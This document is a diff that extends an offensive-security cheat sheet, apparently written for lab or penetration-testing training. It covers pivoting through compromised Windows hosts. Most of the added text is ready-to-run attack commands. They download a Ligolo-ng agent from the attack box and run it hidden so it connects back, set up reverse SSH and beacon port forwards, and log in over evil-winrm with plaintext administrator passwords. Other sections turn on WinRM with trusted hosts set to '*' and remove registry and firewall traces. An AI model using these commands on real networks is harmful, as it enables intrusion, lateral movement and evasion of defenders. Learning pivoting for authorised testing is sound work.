@@ -47,6 +47,38 @@ netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
 netsh interface portproxy reset
 ```
 
+## netsh Port Proxy — Registry Detection and Persistence
+
+netsh portproxy stores its rules in the Windows registry. Blue teams and incident responders check here — know the artifacts you leave behind.
+
+```
+# Registry location for portproxy rules:
+# HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp
+
+# View with reg query:
+reg query HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp
+
+# Output format:
+# 0.0.0.0/8080    REG_SZ    172.16.5.19/3389
+# Key = listenaddress/listenport
+# Value = connectaddress/connectport
+
+# Delete a specific rule directly from registry (alternative to netsh delete):
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp" /v "0.0.0.0/8080" /f
+
+# View via PowerShell:
+Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp"
+
+# Check via netstat (portproxy rules show up as LISTENING):
+netstat -ano | findstr LISTENING
+# Look for unexpected listening ports
+
+# Full cleanup — remove all portproxy rules:
+netsh interface portproxy reset
+# Also remove the firewall rule if you added one:
+netsh advfirewall firewall delete rule name="Pivot 8080"
+```
+
 ## Plink (PuTTY Link) — SSH from Windows
 
 Plink is the command-line SSH client that comes with PuTTY. It supports port forwarding and is commonly available on Windows systems or can be downloaded as a single .exe. Use it to create SSH tunnels from Windows pivots.
@@ -73,6 +105,38 @@ start /b plink.exe -D 9050 -N attacker@10.10.14.5
 
 # Plink as interactive tunnel then leave running:
 plink.exe -N -L 3389:172.16.5.19:3389 ubuntu@10.129.202.64
+```
+
+## Windows SSH Client Pivoting (Native OpenSSH)
+
+Windows 10 1803+ includes OpenSSH client natively. This means SSH port forwarding works on modern Windows without any extra tools.
+
+```
+># Windows 10/2019+ native SSH dynamic forward:
+ssh -D 9050 ubuntu@10.129.202.64 -N
+
+# Local port forward (internal RDP via pivot):
+ssh -L 13389:172.16.5.19:3389 ubuntu@10.129.202.64 -N -f
+
+# Verify SSH is available:
+where ssh
+ssh -V
+
+# Check if OpenSSH is installed:
+Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
+
+# Install if missing (requires internet):
+Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
+
+# Background SSH process on Windows:
+Start-Process ssh -ArgumentList "-D 9050 ubuntu@10.129.202.64 -N" -WindowStyle Hidden
+
+# Remote port forward (pivot sends port back to attack box):
+ssh -R 0.0.0.0:8080:127.0.0.1:80 attacker@10.10.14.5 -N
+# Opens port 8080 on attack box, routes traffic to pivot's localhost:80
+
+# SSH jump through pivot to deeper host:
+ssh -J ubuntu@10.129.202.64 Administrator@172.16.5.19
 ```
 
 ## RDP Tunneling
@@ -121,12 +185,24 @@ socat.exe TCP-LISTEN:9002,fork TCP:172.16.5.19:80 &
 tasklist | findstr socat
 ```
 
-## PowerShell TCP Relay (No Binary)
+## PowerShell TCP Port Forwarding One-Liner
 
-When no tools are available, PowerShell can create a basic TCP relay using System.Net.Sockets. Not ideal for large transfers but functional for establishing connectivity.
+When no tools are available, PowerShell can create a basic TCP relay. A shorter, more practical one-liner approach using a background job.
 
 ```
-># PowerShell TCP relay — forward localhost:8080 to 172.16.5.19:3389
+# PowerShell one-liner TCP forward — background job, forward :8080 → 172.16.5.19:3389
+$j = Start-Job {
+    $l = [Net.Sockets.TcpListener]::new([Net.IPAddress]::Any, 8080); $l.Start()
+    while($true){
+        $c=$l.AcceptTcpClient(); $t=New-Object Net.Sockets.TcpClient("172.16.5.19",3389)
+        $cs=$c.GetStream(); $ts=$t.GetStream()
+        $b1=New-Object byte[] 65536; $b2=New-Object byte[] 65536
+        Start-Job{param($a,$b,$c) while(($n=$a.Read($c,0,$c.Length))-gt 0){$b.Write($c,0,$n)}} -Arg $cs,$ts,$b1
+        Start-Job{param($a,$b,$c) while(($n=$a.Read($c,0,$c.Length))-gt 0){$b.Write($c,0,$n)}} -Arg $ts,$cs,$b2
+    }
+}
+
+# Original full PowerShell TCP relay:
 $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, 8080)
 $listener.Start()
 while ($true) {
@@ -170,6 +246,104 @@ Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
 
 # Background SSH process on Windows:
 Start-Process ssh -ArgumentList "-D 9050 ubuntu@10.129.202.64 -N" -WindowStyle Hidden
+```
+
+## WinRM Tunneling Through HTTP
+
+WinRM (Windows Remote Management) operates over HTTP (5985) and HTTPS (5986). It can be proxied through HTTP tunnels or used over SSH local port forwards as part of a pivot chain.
+
+```
+# Access internal WinRM via SSH local port forward:
+ssh -L 5985:172.16.5.19:5985 ubuntu@10.129.202.64 -N -f
+evil-winrm -i localhost -p 5985 -u Administrator -p 'Password123!'
+
+# Access WinRM via proxychains (SOCKS5 proxy must support HTTP correctly):
+proxychains evil-winrm -i 172.16.5.19 -u Administrator -p 'Password123!'
+
+# WinRM through netsh portproxy on Windows pivot:
+netsh interface portproxy add v4tov4 listenport=5985 listenaddress=0.0.0.0 connectport=5985 connectaddress=172.16.5.19
+
+# Enable WinRM on target (requires admin, run on target):
+Enable-PSRemoting -Force
+Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
+
+# Connect to WinRM via port forward:
+$sess = New-PSSession -ComputerName localhost -Port 5985 -Credential (Get-Credential)
+Enter-PSSession -Session $sess
+
+# WinRM over HTTPS (port 5986) — requires valid cert:
+evil-winrm -i 172.16.5.19 -u Administrator -p 'Password123!' -S
+```
+
+## Ligolo-ng on Windows (Agent Deployment)
+
+Ligolo-ng's Windows agent is a single binary that connects back to your ligolo proxy. Drop it on a Windows pivot and get transparent TUN-based routing without proxychains. See the dedicated Ligolo-ng page for full proxy setup.
+
+```
+# Download Windows agent binary on attack box:
+wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_windows_amd64.zip
+unzip ligolo-ng_agent_windows_amd64.zip
+# Serve it:
+python3 -m http.server 8000
+
+# Deploy agent on Windows pivot via PowerShell:
+Invoke-WebRequest -Uri "http://10.10.14.5:8000/agent.exe" -OutFile "C:\Windows\Temp\agent.exe"
+
+# Execute the agent (connects back to your ligolo proxy):
+C:\Windows\Temp\agent.exe -connect 10.10.14.5:11601 -ignore-cert
+
+# Run hidden (no console window):
+Start-Process -FilePath "C:\Windows\Temp\agent.exe" `
+    -ArgumentList "-connect 10.10.14.5:11601 -ignore-cert" `
+    -WindowStyle Hidden
+
+# Verify agent connected — on attack box in ligolo proxy console:
+ligolo-ng » session
+# Lists connected agents
+
+# Add route on attack box for the internal subnet:
+sudo ip route add 172.16.5.0/24 dev ligolo
+
+# Start the tunnel:
+ligolo-ng » start
+
+# Now all tools work natively from attack box:
+nmap -sV 172.16.5.19
+crackmapexec smb 172.16.5.0/24
+```
+
+## Cobalt Strike / Beacon Pivoting
+
+Cobalt Strike beacons support SOCKS proxy listeners and SSH tunneling. When you have a beacon on a Windows pivot, you can route Cobalt Strike team server traffic through it.
+
+```
+# Beacon SOCKS proxy (from Cobalt Strike console or via script):
+# Interact with beacon → right-click → Pivoting → SOCKS Server
+# Or via aggressor script:
+# beacon_socks(bid, port)   — opens SOCKS4a proxy on team server at :port
+
+# Typical workflow:
+# 1. Beacon checks in on Windows pivot
+# 2. Open SOCKS listener: Beacon ID → Pivoting → SOCKS Server → port 1080
+# 3. Configure proxychains to team server IP:1080 (if team server is accessible)
+# 4. Or: use Cobalt Strike's built-in browser pivot for web access
+
+# SSH tunneling through beacon (requires SSH module):
+# Beacon → Pivoting → SSH Session
+# Connects via SSH from beacon to internal SSH server
+# Creates a tunnel back to team server
+
+# rportfwd — reverse port forward from beacon:
+# Beacon → Pivoting → Listener → create new listener with rportfwd type
+# Or via console: rportfwd [bind port] [forward host] [forward port]
+# e.g.: rportfwd 8080 172.16.5.19 80
+
+# Remove all pivots from a beacon:
+# rportfwd_local stop [bind port]
+# Or via GUI: Beacon → Pivoting → remove
+
+# OPSEC note: SOCKS proxies on beacons generate noticeable traffic patterns
+# — use sparingly in monitored environments
 ```
 
 ## SocksOverRDP — SOCKS Proxy Through RDP Sessions
@@ -235,3 +409,13 @@ set RHOST 10.129.202.64
 set LPORT 8080
 run
 ```
+
+## Resources
+
+- SocksOverRDP — https://github.com/nccgroup/SocksOverRDP
+- Ligolo-ng — https://github.com/nicocha30/ligolo-ng
+- OpenSSH for Windows — https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse
+- PuTTY/Plink — https://www.chiark.greenend.org.uk/~sgtatham/putty/
+- MITRE T1090 — Proxy
+- MITRE T1572 — Protocol Tunneling
+- MITRE T1021.006 — Remote Services: Windows Remote Management
